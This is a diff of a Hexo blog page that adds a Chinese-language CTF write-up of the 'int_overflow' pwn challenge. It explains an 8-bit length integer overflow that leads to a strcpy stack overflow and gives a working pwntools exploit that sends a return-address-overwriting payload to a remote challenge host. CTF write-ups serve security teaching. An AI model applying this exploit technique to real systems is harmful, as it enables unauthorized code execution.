@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: SCTF2020 | Hexo</title>
+  <title>int_overflow | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/tags/SCTF2020/index.html">
+  <meta name="description" content="int_overflow wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="int_overflow">
+<meta property="og:url" content="http://yoursite.com/2020/07/23/int-overflow/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="int_overflow wp">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/07/23/int-overflow/checksec.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/23/int-overflow/shuru.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/23/int-overflow/stack.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/23/int-overflow/tianchong.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/23/int-overflow/flag.png">
+<meta property="article:published_time" content="2020-07-23T15:45:01.000Z">
+<meta property="article:modified_time" content="2020-07-24T15:23:46.176Z">
 <meta property="article:author" content="kitten7">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/23/int-overflow/checksec.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -157,61 +168,251 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-int-overflow" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/11/signin/" class="archive-article-date">
-  	<time datetime="2020-07-11T15:28:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/11/signin/">signin</a>
+    <h1 class="article-title" itemprop="name">
+      int_overflow
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+		<!--显示阅读次数-->
+		
+			<br/>
+			<a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+			<span class="icon-sort"></span>
+			<span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+					阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+			</span>
+			</a>
+			
+        
+				<a href="/2020/07/23/int-overflow/" class="archive-article-date">
+  	<time datetime="2020-07-23T15:45:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-23</time>
+</a>
+				
+			</header>
+		  
+		  <div class="article-entry" itemprop="articleBody">
+			
+				<h1 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow wp"></a>int_overflow wp</h1><a id="more"></a>
+<h2 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><p><img src="/2020/07/23/int-overflow/checksec.png" alt><br>没有开启canary，没有开启PIE。</p>
+<p>尝试运行：<br><img src="/2020/07/23/int-overflow/shuru.png" alt><br>发现会对输入进行验证，不知道这个有没有用。</p>
+<h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>ida查看源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  puts(&quot;~~ Welcome to CTF! ~~&quot;);</span><br><span class="line">  puts(&quot;       1.Login       &quot;);</span><br><span class="line">  puts(&quot;       2.Exit        &quot;);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  printf(&quot;Your choice:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">  if ( v4 &#x3D;&#x3D; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Bye~&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Invalid Choice!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下login()函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int login()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+0h] [ebp-228h]</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+200h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  memset(&amp;buf, 0, 0x200u);</span><br><span class="line">  puts(&quot;Please input your username:&quot;);</span><br><span class="line">  read(0, &amp;s, 0x19u);</span><br><span class="line">  printf(&quot;Hello %s\n&quot;, &amp;s);</span><br><span class="line">  puts(&quot;Please input your passwd:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x199u);</span><br><span class="line">  return check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要注意一下，username和passwd都做了最大长度限制，其中passwd的长度为0x199u，特别的长，需要留意一下。</p>
+<p>check_passwd():</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">char *__cdecl check_passwd(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  char *result; &#x2F;&#x2F; eax</span><br><span class="line">  char dest; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  unsigned __int8 v3; &#x2F;&#x2F; [esp+Fh] [ebp-9h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; strlen(s);</span><br><span class="line">  if ( v3 &lt;&#x3D; 3u || v3 &gt; 8u )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid Password&quot;);</span><br><span class="line">    result &#x3D; (char *)fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    result &#x3D; strcpy(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现v3的大小为8bit(大小：0-255)，用v3来存储passwd的长度，明显是不够的，存在整数溢出漏洞。观察函数，发现当passwd的长度处于4<del>8或者是260</del>264是可以输出“success”的。下面的result是通过将字符串passwd拷贝到dest中，长度是0x14。</p>
+<p>查看一下栈分布：<br><img src="/2020/07/23/int-overflow/stack.png" alt><br>发现，如果passwd的长度大于0x14，就会覆盖到stack中的内容。</p>
+<h2 id="0x03-编写exp"><a href="#0x03-编写exp" class="headerlink" title="0x03 编写exp"></a>0x03 编写exp</h2><p>思路大概是这样：利用整数溢出漏洞，输入大量的passwd字符造成栈溢出。大致长度处于260~264之间，我们选取261.查看一下汇编确认具体的填充数据结构：<br><img src="/2020/07/23/int-overflow/tianchong.png" alt></p>
+<p>注意到0x0804871E处，有一个leave指令(出栈操作)，需要多覆盖四个字节数据。要想覆盖到返回地址，先使用0x14个数据覆盖stack拷贝的passwd的内存区域，然后用4字节数据覆盖ebp，再用”cat flag”的地址覆盖返回地址，最后接上261剩余的数据就可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text:08048694                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048699                 call    _system</span><br><span class="line">.text:0804869E                 add     esp, 10h</span><br><span class="line">.text:080486A1                 nop</span><br><span class="line">.text:080486A2                 leave</span><br><span class="line">.text:080486A3                 retn</span><br></pre></td></tr></table></figure>
+<p>所以payload的构成为：<br>payload = “A”*0x14 + “AAAA” + p32(cat_flag_addr) + “A” * 233(261-0x14-4-4)</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; remote(&#39;220.249.52.133&#39;,38017)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)</span><br><span class="line">sh.sendlineafter(&quot;username:\n&quot;,&quot;flag&quot;)</span><br><span class="line"></span><br><span class="line">cat_flag_addr &#x3D; 0x08048694</span><br><span class="line">payload &#x3D;  &quot;A&quot;*0x14 + &quot;AAAA&quot; + p32(cat_flag_addr) + &quot;A&quot; * 233</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;passwd:\n&quot;,payload)</span><br><span class="line">print sh.recvall()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/23/int-overflow/flag.png" alt><br>flag:cyberpeace{7c5487e9342382668a04b73b7c588750}</p>
+
+			
+		  
+      <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+          <div class="tooltip tooltip-east">
+
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SCTF2020</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://kitten7.github.io/2020/07/23/int-overflow/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/07/22/cgpwn2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">cgpwn2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#int-overflow-wp"><span class="toc-number">1.</span> <span class="toc-text">int_overflow wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-查看文件"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 查看文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-代码分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-编写exp"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 编写exp</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
+  
+
+  
+
+  
+
+
+<!-- 《添加版权声明 -->
+   
+       <!-- 《添加版权声明 -->
+<!--添加版权声明https://github.com/JoeyBling/hexo-theme-yilia-plus/commit/c1215e132f6d5621c5fea83d3c4f7ccbcca074a3-->
+
+
+<!-- #版权基础设定：0-关闭声明； 1-文章对应的md文件里有declare: true属性，才有版权声明； 2-所有文章均有版权声明 -->
+
+  <div class="declare">
+    <strong class="author">本文作者：</strong>
     
+      kitten7
+    
+    <br>
+    <strong class="create-time">发布时间：</strong>
+    2020-07-23
+    <br>
+    <strong class="update-time">最后更新：</strong>
+    2020-07-24
+    <br>
+    <strong class="article-titles">本文标题：</strong>
+    <a href="http://yoursite.com/2020/07/23/int-overflow/" title="int_overflow" target="_blank">int_overflow</a>
+    <br>
+    <strong class="article-url">本文链接：</strong>
+    <a href="http://yoursite.com/2020/07/23/int-overflow/" title="int_overflow" target="_blank">http://yoursite.com/2020/07/23/int-overflow/</a>
+    <br>
+    <strong class="copyright">版权声明：</strong>
+    本作品采用
+    <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议">CC BY-NC-SA 4.0</a>
+    许可协议进行许可。转载请注明出处！
+    
+      <br>
+      <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+    
+  </div>
 
+<!-- 添加版权声明》 -->
+
+   
+<!-- 添加版权声明》 -->
 
           </div>
         </div>
@@ -238,9 +439,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
